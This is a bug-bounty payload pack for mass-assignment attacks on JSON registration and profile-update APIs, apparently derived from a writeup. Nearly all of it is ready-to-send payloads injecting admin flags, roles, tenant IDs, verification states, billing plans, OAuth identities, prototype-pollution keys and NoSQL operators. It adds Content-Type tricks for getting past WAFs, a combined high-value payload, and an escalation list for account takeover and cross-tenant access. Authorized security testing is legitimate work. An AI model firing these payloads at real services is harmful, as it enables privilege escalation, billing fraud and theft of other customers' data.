# Mass-Assignment JSON payloads — packs/writeups/uncovering-invisible-privileges-… (CoffinXP)

Registration / signup / profile-update APIs that deserialize JSON directly into models leak privilege fields when they don't enforce an allowlist. Send these against POST/PUT/PATCH endpoints that accept JSON. Look for: request accepted, injected field reflected in response, or side-effect (role changed, verified=true, tier upgraded, tenant joined).

## Detection oracle
- Register a normal account, capture the response (baseline).
- Register again with an injected field. If the field appears in the response, or subsequent GET /me / GET /profile shows it, → **CONFIRMED mass-assignment**.
- Even if response looks identical, check side effects: `role`, `plan`, `subscription`, `verified`, `active`, `is_admin` in subsequent authenticated calls.

## 1. Baseline (control)
```json
{"username":"probe_01","email":"probe01@example.com","password":"Password1!"}
```

## 2. Admin-flag variants (case + type differentials)
```json
{"username":"u","email":"e@x","password":"p","isAdmin":true}
{"username":"u","email":"e@x","password":"p","admin":"true"}
{"username":"u","email":"e@x","password":"p","ADMIN":1}
{"username":"u","email":"e@x","password":"p","is_admin":1}
{"username":"u","email":"e@x","password":"p","isadmin":true}
{"username":"u","email":"e@x","password":"p","IsAdmin":true}
```

## 3. Role / privilege strings + IDs
```json
{"username":"u","email":"e@x","password":"p","role":"admin"}
{"username":"u","email":"e@x","password":"p","role":"superuser"}
{"username":"u","email":"e@x","password":"p","role":"root"}
{"username":"u","email":"e@x","password":"p","role_id":0}
{"username":"u","email":"e@x","password":"p","role_id":1}
{"username":"u","email":"e@x","password":"p","user_priv":"administrator"}
{"username":"u","email":"e@x","password":"p","permissions":["*"]}
{"username":"u","email":"e@x","password":"p","roles":["admin","user"]}
```

## 4. Tenant / organization takeover
```json
{"username":"u","email":"e@x","password":"p","org":"CompanyA"}
{"username":"u","email":"e@x","password":"p","organization_id":1}
{"username":"u","email":"e@x","password":"p","org_slug":"internal-team"}
{"username":"u","email":"e@x","password":"p","tenant":"master"}
{"username":"u","email":"e@x","password":"p","workspace_id":1}
```

## 5. Nested / prototype-style
```json
{"username":"u","email":"e@x","password":"p","profile":{"bio":"t","visibility":"private"}}
{"username":"u","email":"e@x","password":"p","__proto__":{"isAdmin":true}}
{"username":"u","email":"e@x","password":"p","constructor":{"prototype":{"isAdmin":true}}}
{"username":"u","email":"e@x","password":"p","account":{"meta":{"role":"admin"}}}
{"username":"u","email":"e@x","password":"p","account.role":"admin"}
```

## 6. Type confusion
```json
{"username":"u","email":"e@x","password":"p","admin":"false"}
{"username":"u","email":"e@x","password":"p","admin":0}
{"username":"u","email":"e@x","password":"p","admin":null}
{"username":"u","email":"e@x","password":"p","admin":{}}
{"username":"u","email":"e@x","password":"p","admin":[]}
```

## 7. Array / list tampering
```json
{"username":["array_user"],"email":["a@x"],"password":["p"]}
{"username":"u","email":"e@x","password":"p","roles":["user","admin"]}
{"username":"u","email":"e@x","password":"p","scopes":["*"]}
```

## 8. NoSQL operator injection (Mongo, only in authorized envs)
```json
{"username":"u","email":"e@x","password":"p","isAdmin":{"$ne":null}}
{"username":{"$gt":""},"email":"e@x","password":"p"}
{"username":"u","password":{"$ne":null}}
```

## 9. Aliases / synonyms
```json
{"username":"u","email":"e@x","password":"p","is_superuser":true}
{"username":"u","email":"e@x","password":"p","super_user":true}
{"username":"u","email":"e@x","password":"p","staff":true}
{"username":"u","email":"e@x","password":"p","is_staff":true}
{"username":"u","email":"e@x","password":"p","group":"admin"}
{"username":"u","email":"e@x","password":"p","account_type":"admin"}
```

## 10. Verification / state jump
```json
{"username":"u","email":"e@x","password":"p","email_verified":true}
{"username":"u","email":"e@x","password":"p","verified":true}
{"username":"u","email":"e@x","password":"p","status":"active"}
{"username":"u","email":"e@x","password":"p","state":"verified"}
{"username":"u","email":"e@x","password":"p","verification_expires":"1970-01-01T00:00:00Z"}
```

## 11. Subscription / billing bypass (SaaS crown jewel)
```json
{"username":"u","email":"e@x","password":"p","plan":"pro"}
{"username":"u","email":"e@x","password":"p","plan":"enterprise"}
{"username":"u","email":"e@x","password":"p","subscription_id":9999}
{"username":"u","email":"e@x","password":"p","is_premium":true}
{"username":"u","email":"e@x","password":"p","trial_ends_at":"2050-01-01T00:00:00Z"}
{"username":"u","email":"e@x","password":"p","credits":1000000}
```

## 12. OAuth / provider spoofing
```json
{"username":"u","email":"e@x","password":"p","provider":"google","provider_id":"<victim-google-id>"}
{"username":"u","email":"e@x","password":"p","auth_strategy":"ldap"}
{"username":"u","email":"e@x","password":"p","sub":"<victim-oauth-sub>"}
```

## 13. Metadata / opaque fields
```json
{"username":"u","email":"e@x","password":"p","metadata":{"internal_role":"admin","created_by":"script"}}
{"username":"u","email":"e@x","password":"p","internal":{"role":"admin"}}
```

## 14. String-encoded JSON (schemaless fallback)
```json
{"username":"u","email":"e@x","password":"p","profile":"{\"isAdmin\":true}"}
```

## 15. Content-Type differentials (WAF/parser bypass)
```
Content-Type: text/plain          + {"isAdmin":true,...}     # some frameworks still parse
Content-Type: application/x-www-form-urlencoded + isAdmin=true&...
Content-Type: application/xml     + <user><isAdmin>true</isAdmin></user>
Content-Type: */*
Content-Type: application/json; charset=garbage
Content-Type: application/json; boundary=--
No Content-Type header at all
```

## 16. Combination payload (high-value)
```json
{"username":"combo","email":"c+t@x","password":"p",
 "__proto__":{"isAdmin":true},
 "profile":{"role":"admin"},
 "metadata":"{\"elevate\":true}",
 "plan":"enterprise",
 "email_verified":true}
```

## Cross-endpoint hunting
Don't only test the signup endpoint — the SAME logic often exists on:
- `PATCH /api/users/me` (self-update)
- `POST /api/invites/accept`
- `PUT /api/orgs/:id/members`
- Any onboarding step-2/step-3 endpoint (looser validation before "activation")

## Escalation
- Mass-assign `role:admin` → Admin ATO
- Mass-assign `plan:enterprise` → **Financial impact** (biggest bounties)
- Mass-assign `organization_id:VICTIM` → **Cross-tenant data access**
- Mass-assign `email_verified:true` → **Auth bypass** for downstream flows
- Mass-assign `__proto__.isAdmin:true` → **Prototype pollution → auth bypass in Node.js**
